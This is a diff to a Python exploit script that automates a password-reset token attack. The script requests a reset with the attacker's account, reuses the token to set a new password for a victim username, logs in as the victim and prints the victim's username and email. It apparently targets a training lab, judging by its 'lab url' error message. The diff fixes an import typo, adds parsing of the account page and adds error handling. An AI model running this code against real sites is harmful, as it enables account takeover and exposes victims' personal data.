@@ -1,4 +1,4 @@
-fro  requests import request
+from  requests import request
 from bs4 import BeautifulSoup
 from random import randint
 from sys import argv
@@ -76,17 +76,29 @@ def login(login_url,cookies,username,password):
     data='username='+username+'&password='+password
     print('POST '+login_url+'  '+data)
     res=request(url=login_url,method='POST',headers=headers,data=data)
-    return res
+    soup=BeautifulSoup(res.content.decode(),'html.parser')
+    soup=soup.find('div',{'id':'account-content'})
+    for element in soup.contents:
+        if element=="\n":
+            continue
+        elif element.contents[0].count('Your username')>0 or element.contents[0].count('Your email')>0  :
+            print( element.contents[0])
 
 def pwn(url,attacker_username,victim_username, new_password):
-    cookies=get_session(url)
-    email_url=get_email_box_url(url+'login',cookies)
-    send_reset_password_url(url+'forgot-password',cookies,attacker_username)
-    reset_password_url=get_reset_password_url(email_url,cookies)
-    reset_token=get_reset_token(reset_password_url,cookies)
-    set_new_passwrod(url+'forgot-password',cookies,reset_token,victim_username,new_password)
-    login(url+'login',cookies,victim_username,new_password)
-    print("[+] Pwned Successfully : Now Username is: "+victim_username+'  New Password is: '+new_password)
+    try:
+        cookies=get_session(url)
+        email_url=get_email_box_url(url+'login',cookies)
+        send_reset_password_url(url+'forgot-password',cookies,attacker_username)
+        reset_password_url=get_reset_password_url(email_url,cookies)
+        reset_token=get_reset_token(reset_password_url,cookies)
+        set_new_passwrod(url+'forgot-password',cookies,reset_token,victim_username,new_password)
+        login(url+'login',cookies,victim_username,new_password)
+        print("[+] Pwned Successfully : Now Username is: "+victim_username+'  New Password is: '+new_password)   
+    except AttributeError:
+        login(url+'login',cookies,victim_username,new_password)
+    except:
+        print("[-] Please Provide valid parameters that required , \n [!] Note : when you provide url ,  provide just the lab url ")
+
 
 if __name__ == "__main__":
  print("""
